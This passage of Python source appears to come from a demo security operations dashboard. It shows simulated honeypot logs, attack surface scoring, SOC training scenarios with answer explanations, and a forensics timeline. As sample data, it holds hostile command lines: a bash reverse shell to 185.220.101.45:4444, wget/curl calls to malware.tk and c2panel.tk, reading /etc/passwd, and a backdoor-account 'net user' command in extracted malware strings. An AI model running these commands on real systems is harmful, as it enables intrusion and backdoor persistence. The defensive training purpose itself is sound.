        with col_top:
            st.markdown("**Top Attacker IPs:**")
            top_ips = [
                ("185.220.101.45","Russia","42 attempts"),
                ("91.108.4.200",  "NL",    "31 attempts"),
                ("194.165.16.23", "Iran",  "28 attempts"),
                ("103.75.190.12", "China", "19 attempts"),
                ("45.155.205.14", "Ukr",   "15 attempts"),
            ]
            for ip,country,count in top_ips:
                st.markdown(f"<div style='font-size:0.78rem;padding:3px 0'>"
                            f"🔴 <b>{ip}</b> [{country}] — {count}</div>",
                            unsafe_allow_html=True)

            st.divider()
            st.markdown("**Attack Types:**")
            atypes = {"SSH Brute":45,"HTTP Scan":30,"DB Auth":15,"Admin Login":10}
            for atype,pct in atypes.items():
                st.markdown(
                    f"<div style='margin:2px 0'>{atype} "
                    f"<div style='display:inline-block;background:#ff0033;width:{pct*2}px;height:8px;border-radius:2px;vertical-align:middle'></div>"
                    f" {pct}%</div>", unsafe_allow_html=True)

        # Hourly attack volume
        hours = list(range(24))
        attacks_hr = [_r.randint(0,8) for _ in hours]
        attacks_hr[2]=_r.randint(15,25); attacks_hr[3]=_r.randint(12,20)
        fig2 = px.area(pd.DataFrame({"Hour":hours,"Attacks":attacks_hr}),
                       x="Hour",y="Attacks",title="Attacks per Hour (Today)",
                       color_discrete_sequence=["#ff0033"])
        fig2.update_layout(paper_bgcolor="#0e1117",plot_bgcolor="#0e1117",
                            font={"color":"white"},height=220)
        fig2.update_traces(fillcolor="rgba(255,0,51,0.15)")
        st.plotly_chart(fig2, use_container_width=True, key="hp_hourly")

    with tab_attacks:
        st.subheader("🔴 Live Attack Feed")
        attack_log = []
        honeypots  = ["SSH:22","FTP:21","HTTP:80","MySQL:3306","Admin:8080","RDP:3389"]
        commands   = ["cat /etc/passwd","wget http://malware.tk/payload","ls -la /root",
                      "uname -a","curl http://c2panel.tk/beacon",
                      "SELECT * FROM users","admin/admin","root/toor",
                      "find / -perm -4000 2>/dev/null","/bin/bash -i >& /dev/tcp/185.220.101.45/4444 0>&1"]
        for i in range(25):
            ts = (datetime.now()-timedelta(minutes=_r.randint(0,120))).strftime("%H:%M:%S")
            attack_log.append({
                "Time":     ts,
                "Honeypot": _r.choice(honeypots),
                "Attacker": f"{_r.randint(1,254)}.{_r.randint(1,254)}.{_r.randint(1,254)}.{_r.randint(1,254)}",
                "Command":  _r.choice(commands),
                "Credential":f"{'root' if _r.random()>0.5 else 'admin'}:{'12345' if _r.random()>0.5 else 'password'}",
                "Score":    _r.randint(40,98),
            })
        attack_log.sort(key=lambda x:x["Time"],reverse=True)
        df_attacks = pd.DataFrame(attack_log)
        st.dataframe(df_attacks, use_container_width=True, height=400)

        col_d1,col_d2 = st.columns(2)
        with col_d1:
            if st.button("📤 Send Attacker IPs to Block List"):
                for a in attack_log[:5]:
                    ip = a["Attacker"]
                    if ip not in st.session_state.get("blocked_ips",[]):
                        st.session_state.setdefault("blocked_ips",[]).append(ip)
                st.success("Top 5 attacker IPs added to block list!")
        with col_d2:
            if st.button("🔭 Enrich All Attacker IPs"):
                st.info("Querying AbuseIPDB for 25 attacker IPs… (demo)")

    with tab_config:
        st.subheader("Honeypot Configuration")
        hp_types = [
            {"Name":"SSH Honeypot","Type":"Cowrie","Port":22,"Status":"🟢 Active","Interactions":_r.randint(20,50)},
            {"Name":"HTTP Admin",  "Type":"OpenCanary","Port":8080,"Status":"🟢 Active","Interactions":_r.randint(10,30)},
            {"Name":"MySQL Fake",  "Type":"OpenCanary","Port":3306,"Status":"🟢 Active","Interactions":_r.randint(5,15)},
            {"Name":"FTP Fake",    "Type":"Honeytrap", "Port":21,  "Status":"🟡 Partial","Interactions":_r.randint(1,5)},
            {"Name":"RDP Canary",  "Type":"Canary Token","Port":3389,"Status":"🔴 Offline","Interactions":0},
        ]
        st.dataframe(pd.DataFrame(hp_types), use_container_width=True)

        st.markdown("#### Deploy New Honeypot")
        nc1,nc2,nc3 = st.columns(3)
        nc1.selectbox("Type",["Cowrie SSH","OpenCanary HTTP","Fake DB","HoneyToken","Web Shell"])
        nc2.number_input("Port",1,65535,2222)
        nc3.text_input("Fake Banner","OpenSSH_7.2p2 Ubuntu")
        if st.button("🍯 Deploy Honeypot", use_container_width=True):
            st.success("Honeypot deployed! Listening for attackers…")
            st.info("💡 Tip: Place honeypots in subnets adjacent to real servers for maximum realism.")


# ══════════════════════════════════════════════════════════════════════════════
# 6. ATTACK SURFACE MANAGEMENT
# ══════════════════════════════════════════════════════════════════════════════
def render_attack_surface():
    st.header("🎯 Attack Surface Management")
    st.caption("Asset inventory · Exposure scoring · Port/service risk · AI remediation · n8n scan triggers")

    config   = get_api_config()
    groq_key = config.get("groq_key","") or os.getenv("GROQ_API_KEY","")

    tab_assets, tab_exposure, tab_ports, tab_remediate = st.tabs([
        "🏢 Assets","📊 Exposure","🔌 Ports & Services","🤖 Remediate"])

    ASSETS = [
        {"Asset":"payment-server-01","Type":"Server","OS":"Windows 2019","Criticality":10,"Open Ports":8,"CVEs":3,"Exposure":"🔴 Critical"},
        {"Asset":"DC-01",            "Type":"Server","OS":"Windows 2022","Criticality":10,"Open Ports":12,"CVEs":1,"Exposure":"🔴 High"},
        {"Asset":"web-proxy-01",     "Type":"Server","OS":"Ubuntu 22",   "Criticality":7, "Open Ports":3, "CVEs":0,"Exposure":"🟠 Medium"},
        {"Asset":"workstation-03",   "Type":"Desktop","OS":"Windows 11",  "Criticality":5, "Open Ports":2, "CVEs":5,"Exposure":"🟠 Medium"},
        {"Asset":"laptop-sales-12",  "Type":"Laptop", "OS":"Windows 11",  "Criticality":3, "Open Ports":1, "CVEs":2,"Exposure":"🟡 Low"},
        {"Asset":"file-server-02",   "Type":"Server","OS":"Windows 2016","Criticality":8, "Open Ports":6, "CVEs":7,"Exposure":"🔴 Critical"},
        {"Asset":"vpn-gateway",      "Type":"Network","OS":"Palo Alto",   "Criticality":9, "Open Ports":2, "CVEs":0,"Exposure":"🟠 Medium"},
        {"Asset":"dev-laptop-04",    "Type":"Laptop", "OS":"macOS 14",    "Criticality":4, "Open Ports":4, "CVEs":3,"Exposure":"🟡 Low"},
    ]

    with tab_assets:
        a1,a2,a3,a4 = st.columns(4)
        a1.metric("Total Assets",     len(ASSETS))
        a2.metric("Critical Exposure",sum(1 for a in ASSETS if "Critical" in a["Exposure"]))
        a3.metric("Total CVEs",       sum(a["CVEs"] for a in ASSETS))
        a4.metric("Avg Open Ports",   round(sum(a["Open Ports"] for a in ASSETS)/len(ASSETS),1))
        st.dataframe(pd.DataFrame(ASSETS),use_container_width=True)

        # Risk heatmap by criticality × CVEs
        import random as _r
        fig = px.scatter(pd.DataFrame(ASSETS),x="Open Ports",y="CVEs",size="Criticality",
                          color="Criticality",hover_name="Asset",
                          color_continuous_scale="Reds",title="Asset Risk Matrix")
        fig.update_layout(paper_bgcolor="#0e1117",plot_bgcolor="#0e1117",font={"color":"white"},height=300)
        st.plotly_chart(fig,use_container_width=True,key="as_scatter")

        if N8N_ENABLED and st.button("🔍 Trigger n8n Asset Scan",type="primary",use_container_width=True,key="as_scan"):
            trigger_slack_notify("Attack Surface: Asset scan triggered via n8n","medium")
            st.success("n8n scan triggered — results in ~5 min")

    with tab_exposure:
        st.subheader("Exposure Score by Asset")
        exp_scores = {"payment-server-01":92,"DC-01":88,"file-server-02":85,
                      "vpn-gateway":61,"web-proxy-01":58,"workstation-03":52,
                      "dev-laptop-04":38,"laptop-sales-12":25}
        for asset,score in exp_scores.items():
            color = "#ff0033" if score>=80 else "#f39c12" if score>=50 else "#27ae60"
            st.markdown(
                f"<div style='margin:5px 0'><b style='color:{color}'>{asset}</b> — {score}/100"
                f"<div style='background:#1a1a2e;border-radius:3px;height:14px;margin-top:3px'>"
                f"<div style='background:{color};width:{score}%;height:14px;border-radius:3px'></div></div></div>",
                unsafe_allow_html=True)
        overall = round(sum(exp_scores.values())/len(exp_scores))
        st.metric("Overall Attack Surface Score", f"{overall}/100",
                   delta="↑ action needed" if overall>60 else "✅ manageable",
                   delta_color="inverse" if overall>60 else "normal")

    with tab_ports:
        st.subheader("Open Port Risk")
        ports = [
            {"Port":22,   "Service":"SSH",      "Asset":"payment-server-01","Risk":"🔴 High",  "Reason":"Admin port exposed"},
            {"Port":3389, "Service":"RDP",      "Asset":"DC-01",            "Risk":"🔴 High",  "Reason":"RDP brute force risk"},
            {"Port":445,  "Service":"SMB",      "Asset":"file-server-02",   "Risk":"🔴 High",  "Reason":"Lateral movement vector"},
            {"Port":8080, "Service":"HTTP Alt", "Asset":"web-proxy-01",     "Risk":"🟠 Medium","Reason":"Unencrypted traffic"},
            {"Port":1433, "Service":"MSSQL",    "Asset":"payment-server-01","Risk":"🔴 High",  "Reason":"Database directly accessible"},
            {"Port":443,  "Service":"HTTPS",    "Asset":"web-proxy-01",     "Risk":"🟡 Low",   "Reason":"Encrypted, standard"},
        ]
        st.dataframe(pd.DataFrame(ports),use_container_width=True)
        high_risk = sum(1 for p in ports if "High" in p["Risk"])
        st.error(f"🔴 {high_risk} high-risk ports detected — immediate remediation recommended")

    with tab_remediate:
        st.subheader("🤖 AI Remediation Advisor")
        asset_sel = st.selectbox("Select asset to remediate:",
                                  [a["Asset"] for a in ASSETS],key="as_asset_sel")
        if st.button("🤖 Get AI Remediation Plan",type="primary",use_container_width=True,key="as_ai_remed"):
            asset_data = next((a for a in ASSETS if a["Asset"]==asset_sel),{})
            if groq_key:
                with st.spinner("AI generating remediation plan…"):
                    ai = _groq_call(
                        f"Asset: {asset_sel} | Criticality: {asset_data.get('Criticality',5)}/10 | CVEs: {asset_data.get('CVEs',0)} | Open ports: {asset_data.get('Open Ports',0)}. Give a 5-step remediation plan in priority order.",
                        "You are a security engineer. Be concise and actionable.", groq_key, 250)
                if ai: st.info(f"🤖 Remediation Plan:\n{ai}")
            else:
                st.info(f"""Remediation plan for {asset_sel}:
1. Patch all {asset_data.get('CVEs',0)} outstanding CVEs (highest CVSS first)
2. Restrict SSH/RDP to jump server only — remove direct exposure
3. Apply network segmentation — place behind dedicated VLAN
4. Enable audit logging for all admin actions
5. Schedule quarterly penetration test for this asset""")
def _run_asm_scan(target, scope=[]):
    score = random.randint(45,88)
    subdomains = [
        {"Subdomain":f"www.{target}",    "IP":"93.184.216.34","Open Ports":"80,443","Status":"✅"},
        {"Subdomain":f"api.{target}",    "IP":"93.184.216.35","Open Ports":"443,8080","Status":"⚠️"},
        {"Subdomain":f"mail.{target}",   "IP":"93.184.216.36","Open Ports":"25,587,465","Status":"🔴"},
        {"Subdomain":f"dev.{target}",    "IP":"93.184.216.37","Open Ports":"22,80,443,8443","Status":"⚠️"},
        {"Subdomain":f"admin.{target}",  "IP":"93.184.216.38","Open Ports":"443,8080","Status":"🔴"},
        {"Subdomain":f"vpn.{target}",    "IP":"93.184.216.39","Open Ports":"1194,443","Status":"✅"},
        {"Subdomain":f"ftp.{target}",    "IP":"93.184.216.40","Open Ports":"21,22","Status":"🔴"},
        {"Subdomain":f"staging.{target}","IP":"93.184.216.41","Open Ports":"80,443,8080","Status":"⚠️"},
    ]
    findings = [
        {"title":"FTP Server Exposed","detail":"Cleartext FTP on port 21 — credentials exposed",
         "asset":f"ftp.{target}","severity":"critical","cvss":9.1},
        {"title":"Dev Server SSH Exposed","detail":"SSH on dev server with default banner",
         "asset":f"dev.{target}","severity":"high","cvss":7.5},
        {"title":"Admin Portal Reachable","detail":"Admin login page accessible externally",
         "asset":f"admin.{target}","severity":"critical","cvss":9.8},
        {"title":"Expired Certificate","detail":"mail SSL cert expired 60 days ago",
         "asset":f"mail.{target}","severity":"high","cvss":6.5},
        {"title":"API Rate Limiting Missing","detail":"No rate limiting on /api/v1/auth",
         "asset":f"api.{target}","severity":"medium","cvss":5.3},
    ]
    return {
        "score":score,"subdomain_count":len(subdomains),"open_port_count":23,
        "ssl_issues":2,"tech_count":8,"findings":findings,"subdomains":subdomains,
    }


# ══════════════════════════════════════════════════════════════════════════════
# 7. SOC TRAINING MODE
# ══════════════════════════════════════════════════════════════════════════════
TRAINING_SCENARIOS = {
    "Beginner: Phishing Alert": {
        "difficulty":"🟢 Easy","time_limit":600,"points":100,
        "description":"A user reports a suspicious email. Investigate the domain and determine if it's malicious.",
        "clues":["Check VirusTotal for the domain","Look at the SSL certificate","Check WHOIS registration date"],
        "iocs":{"domain":"phishing-login.ga","ip":"91.108.4.200","score":78,"prediction":"Suspicious"},
        "correct_actions":["mark_malicious","block_ip","notify_user"],
        "mitre":"T1566","answer_explanation":"Domain registered 2 days ago, hosted on known malicious IP. Correct action: block and notify."
    },
    "Intermediate: C2 Beacon": {
        "difficulty":"🟡 Medium","time_limit":900,"points":250,
        "description":"Zeek alerts show regular DNS queries to an unusual domain every 60 seconds. Investigate.",
        "clues":["Check DNS query frequency","Look at destination IP reputation","Analyze query entropy"],
        "iocs":{"domain":"c2panel.tk","ip":"185.220.101.45","score":92,"prediction":"Malware"},
        "correct_actions":["identify_beaconing","block_c2","hunt_other_hosts","escalate"],
        "mitre":"T1071.004","answer_explanation":"DNS beaconing at 60s intervals to DGA domain. C2 channel via DNS. Block + hunt."
    },
    "Advanced: APT Kill Chain": {
        "difficulty":"🔴 Hard","time_limit":1800,"points":500,
        "description":"Multiple alerts across Zeek + Sysmon. Reconstruct the full kill chain and identify the threat actor.",
        "clues":["Correlate DNS + process + network events","Check MITRE ATT&CK techniques","Attribution via TTP overlap"],
        "iocs":{"domain":"malware-c2.tk","ip":"185.220.101.45","score":98,"prediction":"APT"},
        "correct_actions":["reconstruct_timeline","identify_actor","contain_hosts","full_ir"],
        "mitre":"T1059.001+T1071+T1041","answer_explanation":"Full APT kill chain: phish→macro→PowerShell→C2→exfil. Likely APT29 based on TTPs."
    },
}

def render_soc_training():
    st.header("🎓 SOC Training Mode")
    st.caption("Interactive investigation scenarios · Analyst scoring · MITRE ATT&CK curriculum · Skill progression")

    tab_scenarios, tab_active, tab_leaderboard = st.tabs([
        "📚 Scenarios","🎯 Active Training","🏆 Leaderboard"])

    with tab_scenarios:
        st.subheader("Training Curriculum")
        for name, sc in TRAINING_SCENARIOS.items():
            with st.container(border=True):
                st.write(f"**Scenario:** {sc['description']}")
                st.write(f"**Time Limit:** {sc['time_limit']//60} minutes")
                st.markdown("**Clues available:**")
                for c in sc["clues"]: st.write(f"  💡 {c}")
                if st.button(f"▶ Start: {name}", key=f"train_{name}", type="primary"):
                    st.session_state.active_training = name
                    st.session_state.training_start  = datetime.now()
                    st.session_state.training_score  = 0
                    st.session_state.training_actions = []
                    st.session_state.clues_used = 0
                    st.rerun()

    with tab_active:
        active = st.session_state.get("active_training")
        if not active or active not in TRAINING_SCENARIOS:
            st.info("Select a scenario from the Scenarios tab to begin training.")
            return

        sc     = TRAINING_SCENARIOS[active]
        start  = st.session_state.get("training_start", datetime.now())
        elapsed= int((datetime.now()-start).total_seconds())
        remain = max(0, sc["time_limit"] - elapsed)

        # Timer + score header
        tc1,tc2,tc3,tc4 = st.columns(4)
        tc1.metric("Scenario", active[:20])
        tc2.metric("Time Remaining", f"{remain//60}:{remain%60:02d}",
                   delta="⚠️ Hurry!" if remain < 120 else None)
        tc3.metric("Score", st.session_state.get("training_score",0), delta=f"/{sc['points']} pts")
        tc4.metric("Difficulty", sc["difficulty"])

        if remain == 0:
            st.error("⏰ Time's up! Showing answer…")
            st.info(sc["answer_explanation"])

        st.divider()
        st.markdown(f"**📋 Mission:** {sc['description']}")
        st.divider()

        # Investigation tools
        col_tools, col_log = st.columns([2,1])
        with col_tools:
            st.markdown("#### 🔧 Investigation Tools")
            iocs = sc["iocs"]

            tool_tabs = st.tabs(["🔍 IOC Lookup","📊 Splunk Query","🔗 Pivot","💡 Clue"])
            with tool_tabs[0]:
                st.write(f"**IOC:** `{iocs['domain']}` / `{iocs['ip']}`")
                if st.button("🔍 Run IOC Lookup", key="train_ioc"):
                    st.error(f"**Result:** {iocs['prediction']} | Score: {iocs['score']}/100")
                    st.write("AbuseIPDB: 94% | Shodan: 3 open ports | OTX: 8 pulses")
                    _training_action("ioc_lookup", sc, 15)

            with tool_tabs[1]:
                st.code(f"index=ids_alerts domain=\"{iocs['domain']}\" | table _time severity score",
                        language="python")
                if st.button("▶ Run Query", key="train_splunk"):
                    st.success(f"3 results — all {iocs['prediction']} severity {iocs['score']}/100")
                    _training_action("splunk_query", sc, 10)

            with tool_tabs[2]:
                if st.button("🔗 Pivot on IP", key="train_pivot"):
                    st.write(f"Related domains: c2panel.tk, xvk3m9p2.c2panel.tk")
                    st.write(f"Related actor: APT29 (55% confidence)")
                    _training_action("ip_pivot", sc, 20)

            with tool_tabs[3]:
                clues_used = st.session_state.get("clues_used",0)
                if clues_used < len(sc["clues"]):
                    if st.button(f"💡 Reveal Clue ({clues_used+1}/{len(sc['clues'])}) [-10 pts]"):
                        st.info(sc["clues"][clues_used])
                        st.session_state.clues_used = clues_used + 1
                        st.session_state.training_score = max(0,
                            st.session_state.get("training_score",0) - 10)
                else:
                    st.info("All clues revealed.")

            st.divider()
            st.markdown("#### 📝 Your Decision")
            decision = st.radio("Classification:", ["Malicious","Suspicious","False Positive","Need More Info"])
            actions  = st.multiselect("Actions to take:",
                ["Block IP","Block Domain","Notify User","Escalate to Tier-2",
                 "Create IR Ticket","Mark False Positive","Monitor Only","Isolate Host"])
            if st.button("✅ Submit Decision", type="primary", use_container_width=True):
                _evaluate_training_decision(decision, actions, sc)

        with col_log:
            st.markdown("#### 📋 Action Log")
            for act in st.session_state.get("training_actions",[]):
                st.write(f"✅ {act}")
            if st.button("🚪 End Training", use_container_width=True):
                final = st.session_state.get("training_score",0)
                st.session_state.active_training = None
                # Save to leaderboard
                lb = st.session_state.get("leaderboard",[])
                lb.append({"analyst":"You","scenario":active,
                            "score":final,"time":elapsed,"date":datetime.now().strftime("%H:%M")})
                st.session_state.leaderboard = lb
                st.rerun()

    with tab_leaderboard:
        st.subheader("🏆 Analyst Leaderboard")
        lb = st.session_state.get("leaderboard",[])
        demo_lb = [
            {"analyst":"devansh.jain","scenario":"APT Kill Chain","score":480,"time":1245,"date":"Today"},
            {"analyst":"alice.soc","scenario":"C2 Beacon","score":230,"time":612,"date":"Yesterday"},
            {"analyst":"bob.analyst","scenario":"Phishing Alert","score":95,"time":320,"date":"2 days ago"},
        ]
        combined = demo_lb + lb
        combined.sort(key=lambda x:-x["score"])
        for i,(entry) in enumerate(combined[:10],1):
            medal = ["🥇","🥈","🥉"][i-1] if i<=3 else f"#{i}"
            col_m,col_n,col_s,col_sc,col_t = st.columns([0.5,2,2,1,1])
            col_m.write(medal)
            col_n.write(f"**{entry['analyst']}**")
            col_s.write(entry["scenario"])
            col_sc.metric("",entry["score"])
            col_t.write(f"{entry.get('time',0)//60}m{entry.get('time',0)%60}s")

def _training_action(action, sc, points):
    st.session_state.training_score = st.session_state.get("training_score",0) + points
    acts = st.session_state.get("training_actions",[])
    acts.append(f"{action} (+{points} pts)")
    st.session_state.training_actions = acts

def _evaluate_training_decision(decision, actions, sc):
    score = st.session_state.get("training_score",0)
    is_correct_class = (decision == "Malicious")
    correct_actions  = ["Block IP","Block Domain","Escalate to Tier-2","Create IR Ticket"]
    matching = sum(1 for a in actions if a in correct_actions)

    if is_correct_class:
        score += 50
        st.success("✅ Correct classification! +50 pts")
    else:
        st.error(f"❌ Incorrect — this was **Malicious**. {sc['answer_explanation']}")

    if matching > 0:
        pts = matching * 25
        score += pts
        st.success(f"✅ {matching} correct actions! +{pts} pts")

    if not actions:
        st.warning("⚠️ No actions taken — SOC analysts must always take action!")

    score = min(score, sc["points"])
    st.session_state.training_score = score
    st.markdown(f"---\n### 📚 Answer Explanation\n{sc['answer_explanation']}")
    st.write(f"**MITRE Technique:** `{sc['mitre']}`")
    st.metric("Final Score", f"{score}/{sc['points']}")


# ══════════════════════════════════════════════════════════════════════════════
# 8. DIGITAL FORENSICS MODULE
# ══════════════════════════════════════════════════════════════════════════════
def render_digital_forensics():
    st.header("🔬 Digital Forensics & Incident Investigation")
    st.caption("Timeline reconstruction · File hash analysis · Memory artifacts · Chain of custody")

    tab_timeline, tab_hashes, tab_memory, tab_custody = st.tabs([
        "🕐 Timeline","#️⃣ File Hashes","🧠 Memory Artifacts","📋 Chain of Custody"])

    with tab_timeline:
        st.subheader("Incident Timeline Reconstruction")
        col_t1,col_t2 = st.columns([2,1])
        with col_t1:
            # Use replay timeline if available
            timeline = st.session_state.get("replay_timeline",[])
            if not timeline:
                # Demo forensic timeline
                timeline = [
                    {"ts":"09:55:12","source":"Auth","event":"User devansh.jain logged in from 192.168.1.105","severity":"info"},
                    {"ts":"10:02:17","source":"Email","event":"Received Invoice_March2026.docm from unknown@external.com","severity":"medium"},
                    {"ts":"10:02:45","source":"Sysmon","event":"WINWORD.EXE opened suspicious macro document","severity":"high"},
                    {"ts":"10:02:48","source":"Sysmon","event":"WINWORD.EXE spawned powershell.exe -nop -w hidden -enc…","severity":"critical"},
                    {"ts":"10:02:50","source":"DNS","event":"DNS query → c2panel.tk (first seen domain)","severity":"high"},
                    {"ts":"10:02:52","source":"Net","event":"TCP connect → 185.220.101.45:4444 established","severity":"critical"},
                    {"ts":"10:02:55","source":"Sysmon","event":"powershell.exe downloaded stage2.exe to C:\\Temp\\","severity":"critical"},
                    {"ts":"10:03:02","source":"Sysmon","event":"CreateRemoteThread: powershell.exe → explorer.exe","severity":"critical"},
                    {"ts":"10:03:15","source":"Sysmon","event":"certutil.exe -decode encoded.txt C:\\Temp\\payload.exe","severity":"high"},
                    {"ts":"10:03:45","source":"Net","event":"7.8MB outbound transfer → 91.108.4.200:443","severity":"critical"},
                    {"ts":"10:15:00","source":"IDS","event":"Correlation engine: CORR-001 C2+DNS fired","severity":"critical"},
                    {"ts":"10:15:02","source":"n8n","event":"SOAR: Slack+Jira+BlockIP triggered automatically","severity":"info"},
                ]
            sev_icons = {"critical":"🔴","high":"🟠","medium":"🟡","low":"🟢","info":"⚪"}
            for ev in timeline:
                icon = sev_icons.get(ev.get("severity",ev.get("sev","info")),"⚪")
                src  = ev.get("source","?")
                ts   = ev.get("ts","?")
                evt  = ev.get("event", ev.get("detail",ev.get("desc","")))
                col_ts, col_src, col_ev = st.columns([1.2,1.2,5])
                col_ts.code(ts)
                col_src.write(f"**{src}**")
                col_ev.write(f"{icon} {evt}")

        with col_t2:
            st.markdown("#### Evidence Summary")
            st.write("**Incident ID:** INC-2026-0301")
            st.write("**Type:** APT / Malware")
            st.write("**Affected host:** WORKSTATION-01")
            st.write("**User:** devansh.jain")
            st.write("**Duration:** ~13 min")
            st.write("**Data at risk:** 7.8 MB")
            st.divider()
            st.write("**Artifacts collected:**")
            artifacts = ["📄 Zeek conn.log","📄 dns.log","🖥️ Sysmon XML",
                         "📦 stage2.exe (hash)","🧠 Memory dump (simulated)"]
            for a in artifacts: st.write(f"  • {a}")

    with tab_hashes:
        st.subheader("File Hash Analysis")
        col_h1,col_h2 = st.columns([1,2])
        with col_h1:
            hash_input = st.text_area("Paste file hashes (one per line)",
                                       value="e889544aff85ffaf8b0d0da705105dee7c97fe26\n"
                                             "275a021bbfb6489e54d471899f7db9d1663fc695bf3b455389d7d9280a4aada5\n"
                                             "44d88612fea8a8f36de82e1278abb02f",
                                       height=120, key="hash_input")
            if st.button("🔍 Analyze Hashes", use_container_width=True):
                hashes = [h.strip() for h in hash_input.strip().splitlines() if h.strip()]
                st.session_state.hash_results = _analyze_hashes(hashes)

        with col_h2:
            results = st.session_state.get("hash_results", _analyze_hashes(
                ["e889544aff85ffaf8b0d0da705105dee7c97fe26"]))
            if results:
                df = pd.DataFrame(results)
                def _color_verdict(val):
                    if "Malicious" in str(val): return "color:#ff0033;font-weight:bold"
                    if "Suspicious" in str(val): return "color:#f39c12"
                    return "color:#00ffc8"
                st.dataframe(df.style.applymap(_color_verdict,subset=["Verdict"]),
                             use_container_width=True)

    with tab_memory:
        st.subheader("Memory Artifact Analysis (Simulated)")
        st.caption("Simulates Volatility output for the attack scenario")
        memory_artifacts = [
            {"Process":"explorer.exe","PID":1892,"PPID":428,"Suspicious":"✅ Injected code detected","MITRE":"T1055"},
            {"Process":"powershell.exe","PID":4521,"PPID":1234,"Suspicious":"✅ -enc command in memory","MITRE":"T1059.001"},
            {"Process":"stage2.exe","PID":5234,"PPID":4521,"Suspicious":"✅ Unknown binary + network conn","MITRE":"T1105"},
            {"Process":"WINWORD.EXE","PID":1234,"PPID":428,"Suspicious":"✅ Spawned shell process","MITRE":"T1566"},
            {"Process":"certutil.exe","PID":4890,"PPID":4521,"Suspicious":"✅ LOLBin abuse — decode flag","MITRE":"T1140"},
            {"Process":"svchost.exe","PID":812,"PPID":4,"Suspicious":"⬜ Normal","MITRE":""},
            {"Process":"chrome.exe","PID":6234,"PPID":428,"Suspicious":"⬜ Normal","MITRE":""},
        ]
        st.dataframe(pd.DataFrame(memory_artifacts), use_container_width=True)
        st.markdown("**🔍 Strings extracted from stage2.exe (memory):**")
        st.code("""185.220.101.45:4444
/bin/bash -i >& /dev/tcp/185.220.101.45/4444 0>&1
cmd.exe /c net user backdoor Password123! /add
certutil.exe -decode C:\\Temp\\encoded.txt C:\\Temp\\payload.exe
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1)""", language="text")

    with tab_custody:
        st.subheader("Chain of Custody")
        col_coc1,col_coc2 = st.columns([1,2])
        with col_coc1:
            st.write("**Incident ID:** INC-2026-0301")
            st.write("**Analyst:** devansh.jain")
            st.write("**Classification:** CONFIDENTIAL")
            st.write("**Hash of evidence:** SHA256")
            new_action = st.text_input("Add custody note",key="coc_note")
            if st.button("➕ Add Entry"):
                coc = st.session_state.get("coc_log",[])
                coc.append({"ts":datetime.now().strftime("%H:%M:%S"),
                            "analyst":"devansh.jain","action":new_action})
                st.session_state.coc_log = coc
        with col_coc2:
            coc_log = st.session_state.get("coc_log",[]) + [
                {"ts":"10:15:00","analyst":"System","action":"Evidence collected — Zeek+Sysmon logs preserved"},
                {"ts":"10:15:02","analyst":"System","action":"Hash computed for all evidence files"},
                {"ts":"10:16:30","analyst":"devansh.jain","action":"Alert triaged — confirmed malicious"},
                {"ts":"10:17:00","analyst":"devansh.jain","action":"SOAR playbook: Malware Containment executed"},
                {"ts":"10:25:00","analyst":"devansh.jain","action":"IR report generated and shared with CISO"},
            ]
            st.dataframe(pd.DataFrame(coc_log), use_container_width=True)
            coc_text = "\n".join(f"[{e['ts']}] {e['analyst']}: {e['action']}" for e in coc_log)
            st.download_button("⬇️ Export CoC Report",coc_text,
                                "chain_of_custody_INC-2026-0301.txt","text/plain")

def _analyze_hashes(hashes):
    results = []
    known_bad = {
        "e889544aff85ffaf8b0d0da705105dee7c97fe26":{"family":"WannaCry","vt":"68/72","verdict":"Malicious"},
        "275a021bbfb6489e54d471899f7db9d1663fc695bf3b455389d7d9280a4aada5":{"family":"EICAR Test","vt":"55/72","verdict":"Malicious"},
        "44d88612fea8a8f36de82e1278abb02f":{"family":"EICAR","vt":"51/70","verdict":"Malicious"},
    }
    for h in hashes:
        h = h.strip()
        if not h: continue
        if h in known_bad:
            info = known_bad[h]
            results.append({"Hash":h[:20]+"…","Type":_hash_type(h),"Family":info["family"],
                             "VirusTotal":info["vt"],"Verdict":info["verdict"]})
        else:
            results.append({"Hash":h[:20]+"…","Type":_hash_type(h),"Family":"Unknown",
                             "VirusTotal":"0/72","Verdict":"Clean / Not Found"})
    return results

def _hash_type(h):
    l = len(h)
    if l==32:  return "MD5"
    if l==40:  return "SHA1"
    if l==64:  return "SHA256"
    return f"Unknown({l})"


# ══════════════════════════════════════════════════════════════════════════════
# SMART ALERT PRIORITIZATION — Alert Fatigue Reduction Engine
# ══════════════════════════════════════════════════════════════════════════════
def render_alert_prioritization():
    st.header("🎯 Alert Prioritization Engine")
    st.caption("ML-based scoring · Business context · AI risk ranking · Auto-escalate via n8n")

    config   = get_api_config()
    groq_key = config.get("groq_key","") or os.getenv("GROQ_API_KEY","")

    tab_live, tab_model, tab_rules_ap = st.tabs(["🔴 Live Queue","🤖 ML Model","⚙️ Priority Rules"])

    with tab_live:
        import random as _r
        alerts = st.session_state.get("triage_alerts",[])
        if not alerts:
            alerts = [
                {"id":"A001","type":"C2 Beacon",      "asset":"payment-server","asset_criticality":10,"mitre":"T1071","base_score":85,"business_risk":98,"final_priority":1},
                {"id":"A002","type":"Cred Dump",       "asset":"DC-01",         "asset_criticality":10,"mitre":"T1003","base_score":89,"business_risk":95,"final_priority":2},
                {"id":"A003","type":"Ransomware",      "asset":"file-server-02","asset_criticality":9, "mitre":"T1486","base_score":92,"business_risk":91,"final_priority":3},
                {"id":"A004","type":"Lateral Move",    "asset":"workstation-05","asset_criticality":6, "mitre":"T1021","base_score":74,"business_risk":72,"final_priority":4},
                {"id":"A005","type":"DNS Beaconing",   "asset":"laptop-12",     "asset_criticality":4, "mitre":"T1071","base_score":61,"business_risk":48,"final_priority":5},
                {"id":"A006","type":"Failed Login×50", "asset":"vpn-gateway",   "asset_criticality":8, "mitre":"T1110","base_score":55,"business_risk":60,"final_priority":6},
                {"id":"A007","type":"USB Insert",      "asset":"reception-pc",  "asset_criticality":2, "mitre":"T1091","base_score":30,"business_risk":15,"final_priority":7},
            ]

        m1,m2,m3,m4 = st.columns(4)
        m1.metric("Queued Alerts",   len(alerts))
        m2.metric("P1 Critical",     sum(1 for a in alerts if a.get("final_priority",9)<=2))
        m3.metric("Avg Score",       round(sum(a.get("base_score",50) for a in alerts)/len(alerts)))
        m4.metric("Auto-escalated",  sum(1 for a in alerts if a.get("business_risk",0)>=90))

        # Priority matrix chart
        fig = go.Figure()
        colors = ["#ff0033","#ff0033","#e67e22","#f39c12","#f1c40f","#27ae60","#27ae60"]
        for i,alert in enumerate(alerts):
            fig.add_trace(go.Scatter(
